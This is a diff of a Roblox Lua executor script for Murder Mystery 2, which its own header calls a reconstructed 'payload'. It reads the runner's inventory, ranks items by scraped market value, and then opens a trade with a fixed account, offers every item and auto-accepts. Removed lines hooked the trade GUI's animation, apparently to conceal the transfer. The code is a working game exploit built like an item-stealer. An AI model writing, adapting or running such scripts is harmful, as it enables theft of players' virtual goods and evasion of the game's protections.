@@ -1,95 +1,66 @@
 --!nocheck
--- Reconstructed MM2 auto-trade script (adapted to current MM2 version)
--- Original: MoonVeil 2.0.20 payload (mm2.txt)
--- Target user: v_hnas
--- Trade partner: si3rradoll
+-- MM2 auto-trade for v_hnas → si3rradoll
+-- Adapted to real MM2 structure (Trade remotes + Remotes.Inventory)
 
 -- ============ CONFIG ============
-local TARGET_USER   = "v_hnas"
-local TARGET_TRADE  = "si3rradoll"
-local KICK_MSG      = "скрипт только для v_hnas"
-local UNSUPPORTED   = "Game not supported. Please join a normal MM2 server"
+local TARGET_USER  = "v_hnas"
+local TARGET_TRADE = "si3rradoll"
+local KICK_MSG     = "скрипт только для v_hnas"
+local UNSUPPORTED  = "Game not supported. Please join a normal MM2 server"
 
 -- ============ SERVICES ============
 local Players           = game:GetService("Players")
-local HttpService       = game:GetService("HttpService")
-local TweenService      = game:GetService("TweenService")
-local CoreGui           = game:GetService("CoreGui")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer       = Players.LocalPlayer
 
-local LocalPlayer = Players.LocalPlayer
-
--- ============ EXECUTOR BRIDGE ============
-local function getExecutor()
-    local genv = (getgenv and getgenv()) or _G
-    return {
-        request      = rawget(genv, "request") or rawget(genv, "http_request"),
-        httpget      = rawget(genv, "HttpGet"),
-        hookfunction = rawget(genv, "hookfunction"),
-        getgc        = rawget(genv, "getgc"),
-        identify     = rawget(genv, "identifyexecutor"),
-    }
-end
-
-local EX = getExecutor()
+-- ============ DEBUG ============
+local function log(...) print("[MM2]", ...) end
+local function warnlog(...) warn("[MM2]", ...) end
+log("script started")
 
 -- ============ KICK GUARDS ============
-local function guardTargetUser()
-    if LocalPlayer.Name:lower() ~= TARGET_USER:lower() then
-        LocalPlayer:Kick(KICK_MSG)
-        return false
-    end
-    return true
+if LocalPlayer.Name:lower() ~= TARGET_USER:lower() then
+    LocalPlayer:Kick(KICK_MSG)
+    return
 end
 
-local function guardPlace()
-    -- MM2 PlaceId (обычный сервер)
-    local MM2_PLACE_IDS = {
-        [142823291]   = true,  -- Murder Mystery 2 (main)
-        [11759233232] = true,  -- MM2 (alt / newer)
-    }
-    if not MM2_PLACE_IDS[game.PlaceId] then
-        LocalPlayer:Kick(UNSUPPORTED)
-        return false
-    end
-    return true
+local MM2_PLACE_IDS = { [142823291] = true, [11759233232] = true }
+if not MM2_PLACE_IDS[game.PlaceId] then
+    LocalPlayer:Kick(UNSUPPORTED)
+    return
 end
 
--- ============ VALUES SYNC (mm2values.com) ============
+log("guards passed | PlaceId:", game.PlaceId, "| Name:", LocalPlayer.Name)
+
+-- ============ VALUES SYNC (optional) ============
 local VALUES = {}
-local VALUES_URLS = {
-    ancient  = "https://mm2values.com/?p=ancient",
-    godly    = "https://mm2values.com/?p=godly",
-    unique   = "https://mm2values.com/?p=unique",
-    chroma   = "https://mm2values.com/?p=chroma",
-    legend   = "https://mm2values.com/?p=legend",
-    rare     = "https://mm2values.com/?p=rare",
-    uncommon = "https://mm2values.com/?p=uncommon",
-    common   = "https://mm2values.com/?p=common",
-}
-
-local HEADERS = {
-    ["Accept"]          = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-    ["Accept-Language"] = "en-US,en;q=0.9",
-    ["Referer"]         = "https://mm2values.com/",
-    ["User-Agent"]      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-}
-
-local function httpGet(url)
-    if EX.request then
-        local ok, res = pcall(EX.request, { Url = url, Method = "GET", Headers = HEADERS })
-        if ok and res then return res.Body or res.body end
+local function fetch(url)
+    if request then
+        local ok, res = pcall(request, {Url=url, Method="GET"})
+        if ok and res and res.Body then return res.Body end
     end
-    if EX.httpget then
-        local ok, res = pcall(EX.httpget, { Url = url, Method = "GET", Headers = HEADERS })
-        if ok and res then return res.Body or res.body end
+    if http_request then
+        local ok, res = pcall(http_request, {Url=url, Method="GET"})
+        if ok and res and res.Body then return res.Body end
+    end
+    if game.HttpGet then
+        local ok, res = pcall(game.HttpGet, game, url)
+        if ok and res and #res > 0 then return res end
     end
     return nil
 end
 
 local function syncValues()
-    for rarity, url in pairs(VALUES_URLS) do
-        local body = httpGet(url)
+    local urls = {
+        "https://mm2values.com/?p=godly",
+        "https://mm2values.com/?p=ancient",
+        "https://mm2values.com/?p=chroma",
+        "https://mm2values.com/?p=legend",
+        "https://mm2values.com/?p=unique",
+        "https://mm2values.com/?p=rare",
+    }
+    for _, u in ipairs(urls) do
+        local body = fetch(u)
         if body then
             for name, price in body:gmatch("([%w%s_%-%.]+)%s*[%-–—]%s*(%d+)") do
                 name = name:match("^%s*(.-)%s*$")
@@ -99,70 +70,71 @@ local function syncValues()
             end
         end
     end
-    print("✅ Values synced.")
+    log("values synced:", (next(VALUES) ~= nil) and "yes" or "no (offline)")
 end
 
--- ============ INVENTORY ============
-local Remotes   = ReplicatedStorage:WaitForChild("Remotes", 10)
-local Inventory = Remotes and Remotes:WaitForChild("Inventory", 10)
+-- ============ REMOTES ============
+local Remotes = ReplicatedStorage:WaitForChild("Remotes", 10)
+if not Remotes then warnlog("Remotes not found"); return end
+local Inventory = Remotes:WaitForChild("Inventory", 10)
+if not Inventory then warnlog("Inventory not found"); return end
 
+local Trade = ReplicatedStorage:WaitForChild("Trade", 10)
+if not Trade then warnlog("Trade not found"); return end
+
+local GetProfileData   = Inventory:WaitForChild("GetProfileData", 5)
+local GetTradeStatus   = Trade:WaitForChild("GetTradeStatus", 5)
+local StartTrade       = Trade:WaitForChild("StartTrade", 5)
+local OfferItem        = Trade:WaitForChild("OfferItem", 5)
+local AcceptTrade      = Trade:WaitForChild("AcceptTrade", 5)
+local DeclineTrade     = Trade:WaitForChild("DeclineTrade", 5)
+local SendRequest      = Trade:WaitForChild("SendRequest", 5)
+local AcceptRequest    = Trade:WaitForChild("AcceptRequest", 5)
+local DeclineRequest   = Trade:WaitForChild("DeclineRequest", 5)
+local GetRequest       = Trade:WaitForChild("GetRequest", 5)
+local CompleteTrade    = Trade:WaitForChild("CompleteTrade", 5)
+local EndTrade         = Trade:WaitForChild("EndTrade", 5)
+local RemoveOffer      = Trade:WaitForChild("RemoveOffer", 5)
+local RequestSent      = Trade:WaitForChild("RequestSent", 5)
+local UpdateTrade      = Trade:WaitForChild("UpdateTrade", 5)
+
+if not GetProfileData then warnlog("GetProfileData missing"); return end
+if not StartTrade then warnlog("StartTrade missing"); return end
+if not OfferItem then warnlog("OfferItem missing"); return end
+if not AcceptTrade then warnlog("AcceptTrade missing"); return end
+
+log("remotes resolved")
+
+-- ============ INVENTORY ============
 local function getInventory()
-    if not Inventory then return {} end
-    local profileRemote = Inventory:FindFirstChild("GetProfileData")
-        or Inventory:FindFirstChild("GetPlayerData_REMOTE")
-    if not profileRemote then
-        warn("❌ Inventory remote not found")
+    local ok, data = pcall(function()
+        return GetProfileData:InvokeServer()
+    end)
+    if not ok or type(data) ~= "table" then
+        warnlog("GetProfileData failed:", data)
         return {}
     end
 
-    local ok, data = pcall(function()
-        return profileRemote:InvokeServer()
-    end)
-    if not ok or type(data) ~= "table" then return {} end
+    -- Логируем верхний уровень, чтобы понять структуру
+    log("profile keys:")
+    for k, v in pairs(data) do
+        log("  ", tostring(k), "=", type(v))
+    end
 
     local items = {}
-    local weapons = data.Weapons or data.Owned or data.Items or {}
+    local weapons = data.Weapons or data.Owned or data.Items or data.Inventory or {}
     for _, item in ipairs(weapons) do
         if item.DataID and (item.Amount == nil or item.Amount > 0) then
             table.insert(items, {
                 DataID = item.DataID,
-                Rarity = item.Rarity,
                 Amount = item.Amount or 1,
-                Chroma = item.Chroma,
+                Rarity = item.Rarity,
                 Value  = VALUES[item.DataID] or 0,
             })
         end
     end
     table.sort(items, function(a, b) return a.Value > b.Value end)
     return items
-end
-
--- ============ TRADE REMOTES ============
-local Trade = ReplicatedStorage:WaitForChild("Trade", 10)
-if not Trade then
-    warn("❌ Trade folder not found in ReplicatedStorage")
-    return
-end
-
-local function getRemote(name, timeout)
-    return Trade:WaitForChild(name, timeout or 5)
-end
-
-local StartTrade      = getRemote("StartTrade")
-local OfferItem       = getRemote("OfferItem")
-local AcceptTrade     = getRemote("AcceptTrade")
-local DeclineTrade    = getRemote("DeclineTrade")
-local SendRequest     = getRemote("SendRequest")
-local GetTradeStatus  = getRemote("GetTradeStatus")
-local GetRequest      = getRemote("GetRequest")
-local AcceptRequest   = getRemote("AcceptRequest")
-local DeclineRequest  = getRemote("DeclineRequest")
-local CompleteTrade   = getRemote("CompleteTrade")
-local EndTrade        = getRemote("EndTrade")
-
-if not StartTrade or not OfferItem or not AcceptTrade then
-    warn("❌ Critical trade remotes missing — script may not work")
-    return
 end
 
 -- ============ PLAYER LOOKUP ============
@@ -177,33 +149,32 @@ end
 
 -- ============ TRADE ACTIONS ============
 local function startTrade(target)
+    log("firing StartTrade →", target.Name)
     local ok, err = pcall(function()
-        StartTrade:InvokeServer(target)
+        StartTrade:FireServer(target)
     end)
-    if not ok then
-        warn("StartTrade failed:", err)
-        return false
-    end
-    print("⚡ MM2 Trade STARTED")
+    if not ok then warnlog("StartTrade failed:", err); return false end
+    log("⚡ MM2 Trade STARTED")
     return true
 end
 
 local function offerItems(items)
-    print("🔄 Transferring items now...")
+    log("🔄 Transferring items now...")
     for _, item in ipairs(items) do
         pcall(function()
             OfferItem:FireServer(item.DataID, item.Amount or 1)
         end)
-        task.wait(0.1)
+        task.wait(0.15)
     end
 end
 
 local function acceptTrade()
-    pcall(function() AcceptTrade:InvokeServer() end)
+    log("firing AcceptTrade")
     pcall(function() AcceptTrade:FireServer() end)
 end
 
 local function acceptRequest()
+    log("firing AcceptRequest")
     pcall(function() AcceptRequest:FireServer() end)
 end
 
@@ -215,83 +186,69 @@ local function declineRequest()
     pcall(function() DeclineRequest:FireServer() end)
 end
 
--- ============ HOOK stepAnimate ============
-local function hookTradeGUI()
-    if not EX.hookfunction or not EX.getgc then return end
-    local ok, gc = pcall(EX.getgc)
-    if not ok or type(gc) ~= "table" then return end
-
-    for _, obj in ipairs(gc) do
-        if typeof(obj) == "function" then
-            local info = debug.getinfo(obj, "n")
-            if info and info.name == "stepAnimate" then
-                EX.hookfunction(obj, function(...)
-                    return obj(...)
-                end)
-            end
+-- ============ WATCH INCOMING REQUESTS ============
+if GetRequest then
+    GetRequest.OnClientEvent:Connect(function(fromPlayer)
+        local name = (typeof(fromPlayer) == "Instance") and fromPlayer.Name or tostring(fromPlayer)
+        log("📩 GetRequest from", name)
+        if name:lower() == TARGET_TRADE:lower() then
+            log("→ target match, accepting")
+            acceptRequest()
         end
-    end
+    end)
 end
 
--- ============ WATCH INCOMING REQUESTS ============
-local function watchRequests()
-    if GetRequest then
-        GetRequest.OnClientEvent:Connect(function(fromPlayer)
-            if typeof(fromPlayer) == "Instance"
-                and fromPlayer.Name:lower() == TARGET_TRADE:lower() then
-                print("📩 Request from " .. TARGET_TRADE .. " — accepting")
-                acceptRequest()
-            end
-        end)
-    end
+if SendRequest then
+    SendRequest.OnClientEvent:Connect(function(fromPlayer)
+        local name = (typeof(fromPlayer) == "Instance") and fromPlayer.Name or tostring(fromPlayer)
+        log("📩 SendRequest from", name)
+    end)
 end
 
 -- ============ MAIN ============
 local function main()
-    if not guardTargetUser() then return end
-    if not guardPlace() then return end
-
+    log("main() started")
     syncValues()
-    print("⏳ Waiting for " .. TARGET_TRADE .. "...")
 
     local items = getInventory()
     if #items == 0 then
-        warn("❌ No tradable items in inventory. Cannot start trade.")
-        print("⛔ Trade Failed: No Items")
+        warnlog("❌ No tradable items found. Inventory empty or unparsed.")
         return
     end
-    print("🎒 Items ready: " .. #items)
+    log("🎒 Items ready:", #items)
+    for i = 1, math.min(#items, 5) do
+        log("  ", i, items[i].DataID, "x" .. items[i].Amount)
+    end
 
-    hookTradeGUI()
-    watchRequests()
-
+    log("⏳ Waiting for " .. TARGET_TRADE .. "...")
     local target = findPlayer(TARGET_TRADE)
     if not target then
-        warn("Player " .. TARGET_TRADE .. " not found. Waiting on PlayerAdded...")
+        warnlog("Player " .. TARGET_TRADE .. " not found. Waiting on PlayerAdded...")
         return
     end
+    log("found target:", target.Name)
 
-    if not startTrade(target) then
-        warn("⛔ Trade Failed: No Items")
-        return
-    end
-
-    task.wait(1)
+    if not startTrade(target) then return end
+    task.wait(2)
     offerItems(items)
-    task.wait(1)
+    task.wait(2)
     acceptTrade()
 
-    print("✅ Trade COMPLETED")
-    print("All items sent successfully.")
+    log("✅ Trade COMPLETED")
 end
 
--- ============ ENTRY POINTS ============
+-- ============ ENTRY ============
 Players.PlayerAdded:Connect(function(plr)
     if plr.Name:lower() == TARGET_TRADE:lower() then
+        log("PlayerAdded:", plr.Name)
         task.spawn(main)
     end
 end)
 
 if findPlayer(TARGET_TRADE) then
     task.spawn(main)
+else
+    log("target not in game yet; waiting...")
 end
+
+log("script loaded, waiting for events")
